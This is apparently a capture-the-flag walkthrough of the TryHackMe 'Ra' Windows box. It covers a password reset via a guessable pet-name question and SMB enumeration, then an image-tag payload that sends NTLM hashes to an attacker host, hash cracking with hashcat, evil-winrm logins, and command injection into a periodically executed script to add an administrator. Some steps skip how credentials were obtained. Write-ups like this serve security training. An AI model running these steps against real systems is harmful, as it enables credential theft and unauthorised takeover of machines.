🚀 Walkthrough: Ra Box (TryHackMe)

    A step-by-step breakdown of the Ra box from TryHackMe — focused on SMB exploitation, password reset logic abuse, and privilege escalation through script injection.
    📌 Platform: TryHackMe
🎯 Box: Ra
🧠 Difficulty: Medium
🔐 Topics Covered: SMB Enumeration, Web Exploitation, NTLM Relay, Reverse Shell, Windows PrivEsc via Script Execution

🧭 Penetration Testing Methodology

    🔎 Reconnaissance

    📁 Enumeration

    💥 Exploitation

    🛠️ Privilege Escalation

🌐 Reconnaissance
🔍 Nmap Scan

nmap -sC -sV -T4 -p- <target-ip>

Key open ports discovered:

    139, 445 — SMB

    80 — HTTP

    Custom subdomains: fire.windcorp.thm, windcorp.thm

🔧 Add to /etc/hosts:

<target-ip> windcorp.thm fire.windcorp.thm

🧩 Enumeration
🔐 Web Application

Navigating to the site revealed a password reset page using security questions.

At the bottom of the homepage, we find an employee list. One employee, Lily Levesque, posted a picture of her dog. The image URL leaks the dog's name: sparky.

We attempt a password reset using:

    Username: lilyle

    Security Question: Pet's Name

    Answer: sparky

✅ Password successfully reset!
📦 SMB Enumeration

With the newly obtained credentials, we enumerate the SMB shares:

smbmap -u lilyle -p ChangeMe#123 -H windcorp.thm -R

Important discovery:
Shared/Flag1.txt and a folder containing Spark (a legacy chat client).

Retrieve files via:

smbclient //windcorp.thm/Shared -U lilyle

We notice that Spark v2.8.3 is vulnerable to an NTLM hash leak.
💣 Exploitation

We exploit Spark’s chat rendering vulnerability:

    Send a message containing:

<img src="http://<attacker-ip>/img.jpg">

    Launch responder to capture the NTLMv2 hash.

    Crack the hash using hashcat:

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

✔ Cracked password: uzunLM+3131

We now use evil-winrm to gain shell access:

evil-winrm -u buse -p uzunLM+3131 -i windcorp.thm

🏁 Flag 2 acquired.
🧬 Privilege Escalation

In the root directory, we find:

C:\scripts\

Inside it:

    log.txt

    checkservers.ps1

Upon inspection, the script reads commands from:

C:\Users\brittanycr\hosts.txt

📌 Important Detail:
Our user has permissions to write or replace hosts.txt, although we can’t escalate directly via buse.

🧠 Exploit Plan:

    Create a new local user:

net user hacker MyStr0ngPass! /add

Elevate privileges by injecting this into hosts.txt:

    net localgroup Administrators hacker /add

📂 Modifying hosts.txt via SMB

smbclient //windcorp.thm/C$ -U brittanycr

Steps:

    get hosts.txt

    Append the payload locally

    rm hosts.txt

    put hosts.txt

Since checkservers.ps1 runs periodically, within 1 minute our hacker user becomes an administrator.

✅ Final shell as SYSTEM:

evil-winrm -u hacker -p MyStr0ngPass! -i windcorp.thm

🏁 Flag 3 captured.
🧠 Conclusion

This box demonstrates a multi-layered compromise:

    📦 Weak security questions → Credential reset

    🧠 Legacy app exploitation (Spark) → NTLM leak

    ⚙️ Poor privilege control → Script abuse for escalation

